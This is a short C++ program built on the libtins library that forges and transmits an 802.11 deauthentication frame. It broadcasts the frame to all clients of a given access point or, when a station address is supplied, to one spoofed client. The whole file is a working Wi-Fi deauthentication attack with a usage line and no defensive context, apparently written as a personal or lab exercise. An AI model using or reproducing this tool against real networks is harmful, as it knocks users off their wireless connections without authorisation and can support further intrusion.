#include <iostream>
#include <unistd.h>
#include <tins/tins.h>

using namespace Tins;
using namespace std;

int main(int argc, char** argv) {

        if(argc<2 || argc>4){
            printf("usage:\n  send_deauth <interface> <dst_ap_mac> [<src_station_mac>] \n");
            return 0;
        }

        Dot11Deauthentication deauth;

        if(argc==3){
        deauth.addr1("FF:FF:FF:FF:FF:FF"); // why don't notebook? anyway, check smartphone! done well!!
        deauth.addr2((Dot11::address_type)argv[2]); // STATION
        deauth.addr3((Dot11::address_type)argv[2]); // BSSID
        }

        if(argc==4){
        deauth.addr1((Dot11::address_type)argv[2]);
        deauth.addr2((Dot11::address_type)argv[3]);
        deauth.addr3((Dot11::address_type)argv[2]);
        }

        //deauth.reason_code(3);
        //RadioTap radio = RadioTap();
        //radio.inner_pdu(deauth);

        RadioTap radio = RadioTap() / deauth;

        PacketSender sender;
        sender.send(radio, (NetworkInterface)argv[1]);

}
